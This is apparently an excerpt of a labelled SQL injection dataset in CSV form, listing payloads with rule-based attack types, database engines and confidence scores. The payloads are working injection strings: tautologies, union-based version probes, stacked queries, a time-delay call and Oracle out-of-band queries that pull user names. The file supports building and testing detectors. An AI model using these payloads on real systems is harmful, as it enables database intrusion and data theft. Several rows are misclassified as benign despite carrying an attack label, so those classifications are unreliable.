row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
180,select * from users where id = 1 + \+%1 or 1 = 1 -- 1,1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
181,"select * from users where id = 1 or "";1"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
182,"select * from users where id = 1 or ""%&"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
183,1 and 1 = 1,1,,boolean_blind,generic,0.85,and 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
184,or 0 = 0 #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
185,union select * from users where login = char ...,1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
186,"select * from users where id = 1 union select 1||@,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
187,admin' ) or '1' = '1'--,1,,boolean_blind,generic,0.95,or '1' = '1' detected — boolean_blind injection (priority 8) on generic,rule-based
188,1;SELECT *,1,,stacked_queries,generic,0.85,;SELECT  detected — stacked_queries injection (priority 3) on generic,rule-based
189,"select * from users where id = 1 or ""{;"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
190,x' and 1 = ( select count ( * ) from tabname ) ; --,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
191,"select * from users where id = '1' or """"<@ union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
192,"select * from users where id = 1 or ""?,"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
193,"select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'",1,,union_based,oracle,0.95,union select detected — union_based injection (priority 7) on oracle,rule-based
194,"1 or benchmark ( 10000000,MD5 ( 1 ) ) #",1,,time_blind,generic,0.95,benchmark ( is database-specific time-delay function — time-based blind inference (priority 5),rule-based
195,procedure,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
196,or '' = ',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
197,AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.LOGIN_USER FROM DUAL ) ) AND 'i' = 'i,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
198,"AND 1 = utl_inaddr.get_host_address ( ( SELECT DISTINCT ( USERNAME ) FROM ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS ) WHERE LIMIT = 2 ) ) AND 'i' = 'i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
199,\'; desc users; --,1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
200,"select * from users where id = 1 or ( \. ) = 1 union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
201,select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1',1,,boolean_blind,generic,0.95,"or 1 = 1, 1 = 1 or detected — boolean_blind injection (priority 8) on generic",rule-based
202,""" or """"^""",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
203,"""-""",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
204,"select * from users where id = 1 or \< = 1 union select 1,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
205,"select * from users where id = 1 union select 1<@$,version ( ) -- 1",1,,union_based,generic,0.95,union select detected — union_based injection (priority 7) on generic,rule-based
206,"select * from users where id = 1 *\ union select null,@@VERSION -- 1",1,,union_based,mysql,0.95,union select detected — union_based injection (priority 7) on mysql,rule-based
207,"select * from users where id = '1' or !<@ union select 1,version ( ) -- 1'",1,,union_based,generic,0.95,"union select, @ union select detected — union_based injection (priority 7) on generic",rule-based
208,"select * from users where id = 1 or "".%"" or 1 = 1 -- 1",1,,boolean_blind,generic,0.95,or 1 = 1 detected — boolean_blind injection (priority 8) on generic,rule-based
209,admin'/*,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
